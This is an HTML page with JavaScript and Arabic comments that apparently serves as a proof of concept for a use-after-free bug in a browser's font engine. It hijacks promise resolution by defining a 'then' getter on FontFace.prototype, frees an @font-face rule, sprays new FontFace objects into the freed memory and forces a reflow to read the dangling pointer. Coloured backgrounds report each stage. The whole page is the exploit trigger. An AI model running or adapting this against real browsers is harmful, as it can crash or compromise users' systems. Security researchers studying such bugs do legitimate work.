<!DOCTYPE html>
<html>
<head>
<style id="s">
/* يجب أن يشير الخط إلى رابط غير موجود لإجبار المحرك على الدخول في حالة الانتظار */
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body style="background: black; color: white; font-family: monospace;">
    <div id="status">جاري بدء الاختبار...</div>

<script>
window.onload = () => {
    // تغيير الخلفية للأزرق تعني أن الصفحة حملت وبدأ التنفيذ الحقيقي
    document.body.style.background = "blue";
    document.getElementById("status").innerText = "تم تحميل الصفحة - جاري بناء الفخ...";

    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    
    // إجبار المحرك على تفعيل خاصية التطابق
    void A.loaded;

    let fired = false;
    
    // إعادة تعريف "then" لسرقة التحكم أثناء معالجة الوعد (Promise Resolution)
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                
                // تغيير اللون للأرجواني يعني أن المتصفح وقع في الفخ ودخل إلى الـ Getter
                document.body.style.background = "purple";
                
                // توليد كائنات خطوط جديدة لشغل مساحة الذاكرة فوراً بعد الحذف
                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                
                // تدمير القاعدة الأصلية (تحرير الذاكرة - Use After Free)
                document.getElementById('s').sheet.deleteRule(0);
                
                // إجبار المتصفح على إعادة الحساب (Reflow) لقراءة المؤشر الميت
                document.body.offsetTop;
            }
            return undefined;
        }
    });

    // إطلاق الزناد
    document.fonts.load('1em x', 'AB');
};
</script>
</body>
</html>
